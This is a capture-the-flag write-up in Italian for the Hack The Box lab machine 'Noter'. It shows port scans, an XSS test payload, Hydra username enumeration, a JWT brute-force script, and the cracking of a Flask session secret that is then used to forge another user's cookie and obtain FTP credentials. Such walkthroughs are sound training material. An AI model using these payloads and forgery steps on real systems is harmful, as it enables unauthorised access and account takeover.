#+title: HTB - Noter
#+author: Andra Pepe
#+date: 21/05/2022

* Foothold
** nmap
#+begin_example
$ nmap -sC -sV noter                                                                    1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 19:24 CEST
Nmap scan report for noter (10.10.11.160)
Host is up (0.045s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
#+end_example

#+begin_example
$ nmap -p- noter          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 19:24 CEST
Nmap scan report for noter (10.10.11.160)
Host is up (0.082s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 35.73 seconds
#+end_example

#+begin_example
$ sudo nmap -sU noter                                                                   1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 19:25 CEST
Stats: 0:13:19 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 83.48% done; ETC: 19:41 (0:02:38 remaining)
Nmap scan report for noter (10.10.11.160)
Host is up (2.2s latency).
Not shown: 930 closed udp ports (port-unreach), 50 open|filtered udp ports (no-response)
PORT      STATE    SERVICE
69/udp    filtered tftp
464/udp   filtered kpasswd5
996/udp   filtered vsinet
1070/udp  filtered gmrupdateserv
16862/udp filtered unknown
17585/udp filtered unknown
18958/udp filtered unknown
19140/udp filtered unknown
19197/udp filtered unknown
19687/udp filtered unknown
20366/udp filtered unknown
21364/udp filtered unknown
25280/udp filtered unknown
29810/udp filtered unknown
32772/udp filtered sometimes-rpc8
33354/udp filtered unknown
40732/udp filtered unknown
41081/udp filtered unknown
49196/udp filtered unknown
58640/udp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1082.87 seconds
#+end_example

** Web server
*** XSS
Iscrivendoci come utente ~andrea:andrea~ aggiungiamo delle note e
notiamo che è possibile ottenere un *XSS* in quanto, scrivendo una nota
come segue, è stato possibile ottenere un alert poi quando viene
aperta:

#+begin_source js
title: alert

body:
</textarea><script>alert('1')</script>
#+end_source

Tuttavia il Cross-Site Scripting non ci permette di ottenere alcuna
informazione utile. 


*** Hydra
Invece, provando ad effettuare vari login, si nota che se sono
sbagliati sia username che password, il sistema stampa il messaggio
*Invalid credentials*; invece, se l'username è corretto e la password no
(ad esempio mettendo come username ~andrea~ dell'utente precedentemente
creato), il sistema stampa *Invalid login*.
Si può quindi effettuare una *enumerazione degli username* utilizzando
~Hydra~.

#+begin_example
$ hydra noter http-form-post "/login:username=^USER^&password=a:Invalid credentials" -L ~/Scrivania/gitFolder/SecLists/Usernames/xato-net-10-million-usernames.txt -p a -s 5000 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-22 09:26:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://noter:5000/login:username=^USER^&password=a:Invalid credentials
[5000][http-post-form] host: noter   login: blue   password: a
[5000][http-post-form] host: noter   login: andrea   password: a
[STATUS] 1702.00 tries/min, 1702 tries in 00:01h, 8293753 to do in 81:13h, 16 active
[5000][http-post-form] host: noter   login: Andrea   password: a
[STATUS] 1744.33 tries/min, 5233 tries in 00:03h, 8290222 to do in 79:13h, 16 active
[5000][http-post-form] host: noter   login: Blue   password: a
[STATUS] 1667.43 tries/min, 11672 tries in 00:07h, 8283783 to do in 82:48h, 16 active
[5000][http-post-form] host: noter   login: BLUE   password: a
#+end_example

Notiamo che è presente un utente con username ~blue~.
*** JWT
Sniffando la comunicazione HTTP con ~BurpSuite~, vediamo che al momento
del login il server risponde con un *Set-Cookie* che ci indica di
assegnare al cookie *session* un valore che sembra essere un *JWT (JSON
Web Token)*. Infatti, andando sul sito https://jwt.io/, si vede che
tale cookie corrisponde ad un token ben preciso:
#+begin_example
JWT: eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kcmVhIn0.Yoni9Q.Jf0kt4bawoe07Oxo5IKHjuaDlrw

Header:
{
  "logged_in": true,
  "username": "andrea"
}

Payload:
"b���"
#+end_example

I ~JWT~ sono ottenuti tipicamente col seguente algoritmo:
#+begin_example
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret
)
#+end_example

Se il segreto usato per l'encoding è abbastanza debole, si potrebbe
provare a farne un brute-force, in modo da poi poter fare un encoding
di un token perl'username *blue*.

#+begin_src python
#!/usr/bin/python3

import jwt;
import sys
from termcolor import colored

print (colored("Script to brute-force JWT secret token",'white'))
encoded = input("Enter encoded payload (your JWT): ")

if (len(sys.argv) < 2):
    print("Usage: python3 jwt_bruteforce.py <wordlist>\n")
    exit(1)

wordlist = sys.argv[1]

with open(wordlist) as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
            print (colored('Success! Token decoded with ....[' + secret.rstrip() + ']','green'))
            break
        except UnicodeDecodeError:
            print(colored("skipped " + secret.rstrip(), "orange"))
        except jwt.InvalidTokenError:
            print (colored('Invalid Token .... [' + secret.rstrip() + ']','red'))
        except jwt.ExpiredSignatureError:
            print (colored('Token Expired ....[' + secret.rstrip() + ']','red'))
#+end_src
Tuttavia, il brute-force con questo codice non funziona.

Essendo che il Web Server usa ~Werkzeug~ che di solito utilizza python,
potrebbe essere che dietro c'è ~Flask~, in quanto il nome del cookie è
*session*, quello di default utilizzato da Flask.
Installiamo il tool *flask-unsign* e con il seguente comando riusciamo a
scoprire il secret:

#+begin_example
$ flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kcmVhIn0.Yoni9Q.Jf0kt4bawoe07Oxo5IKHjuaDlrw"
[*] Session decodes to: {'logged_in': True, 'username': 'andrea'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
#+end_example

Dunque, *secret key* : ~b'secret123'~

Generiamo il cookie dell'utente *blue*:

#+begin_example
$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yon9dg.giFrORwdyYs9_IEzav38S6kJki8
#+end_example

** ftp
Nel web server, navigando con il cookie dell'utente *blue*, si è letta
la seguente nota:
#+begin_example

    Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin
#+end_example

Credenziali per ftp:
*blue:blue@Noter!*
